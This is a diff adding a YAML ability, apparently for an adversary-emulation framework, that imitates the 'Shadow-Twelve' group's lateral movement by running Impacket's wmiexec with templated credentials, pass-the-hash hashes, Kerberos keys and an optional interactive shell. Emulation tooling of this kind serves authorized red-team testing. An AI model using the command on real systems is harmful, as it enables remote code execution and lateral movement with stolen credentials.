@@ -1,0 +1,57 @@
+- id: 612b6cfa-4ebe-4e50-bb1f-9feff9f4aaan
+  name: "[SHADOW-TWELVE] WMIExec via Impacket execution"
+  description: "Shadow использует wmiexec из фреймворка Impacket для выполнения различных команд и перемещения по сети."
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.002
+    name: "Remote Services: DCOM (Distributed Component Object Model)"
+  platforms:
+    windows:
+      psh:
+        command: |
+          .\wmiexec.exe "#{auth_string}" "#{command}" #{hashes} #{aes_key} #{dc_ip} #{shell_type} #{other_args}
+        timeout: 120
+        payloads:
+          - wmiexec.exe
+    
+    # пересобрать ELF
+    # darwin,linux:
+    #   sh:
+    #     command: |
+    #       ls -la;
+    #       chmod +x ./wmiexec;
+    #       ./wmiexec "#{auth_string}" "#{command}" #{hashes} #{aes_key} #{dc_ip} #{shell_type} #{other_args}
+    #     timeout: 120
+    #     payloads:
+    #       - wmiexec
+  variables:
+    - key: auth_string
+      description: |
+        Authentication target in format:
+        [domain/]username[:password]@target_ip
+        Example: corp/john:Pass123@192.168.1.10
+      validation: ^([\w\.-]+/)?[\w\.-]+(:[^@]*)?@[\w\.-]+$
+
+    - key: command
+      description: Command to execute (empty for interactive shell)
+      value: "hostname"
+      
+    - key: hashes
+      description: "LM:NT hashes (optional)"
+      validation: ^([a-fA-F0-9]{32}:[a-fA-F0-9]{32})?$
+      
+    - key: aes_key
+      description: "AES Kerberos key (hex, optional)"
+      validation: ^[a-fA-F0-9]{32,64}?$
+      
+    - key: dc_ip
+      description: "Domain Controller IP (optional)"
+      validation: ^\d{1,3}(\.\d{1,3}){3}?$
+      
+    - key: shell_type
+      description: "Shell type [cmd|powershell] (optional)"
+      validation: ^(cmd|powershell)?$
+      
+    - key: other_args
+      description: "Additional arguments (e.g., -debug -nooutput)"
+      value: ""
